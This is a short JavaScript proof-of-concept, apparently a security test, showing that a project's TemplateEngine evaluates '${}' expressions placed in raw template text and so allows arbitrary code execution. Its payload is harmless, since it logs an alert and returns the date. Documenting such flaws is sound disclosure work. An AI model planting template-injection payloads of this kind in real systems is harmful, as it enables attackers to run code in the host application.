/**
 * Case 2: Template Literal Interpolation Injection
 *
 * This POC demonstrates how the ${} syntax in the template string is automatically
 * evaluated by JavaScript because the entire message is compiled into a template literal.
 *
 * Vulnerability: The TemplateEngine does not escape or sanitize the $ character
 * in the raw template text.
 *
 * Risk: Similar to backticks, if an attacker can inject ${} into the template source,
 * they can execute arbitrary JavaScript in the context of the render function.
 */

import {TemplateEngine} from "../src/template/engine.js"

console.log(`--- CASE 2: INTERPOLATION INJECTION ---`)

// The developer/attacker puts ${} directly in the message block.
// This is evaluated because the result of compilation is a `...` string.
const maliciousTemplate = `
  <g-base>
    <g-message>
      Server Time: \${console.log("!!! VULNERABILITY ALERT: Interpolation injection successful !!!") || new Date()}
    </g-message>
  </g-base>
`

console.log(`Compiling template...`)
const messages = TemplateEngine.compileBlockGMessage(maliciousTemplate)

console.log(`Executing compiled function...`)
const render = messages.default?.default
if (!render) throw new Error(`compile produced no default message`)
const result = render({})
console.log(`Final Result:`, result)
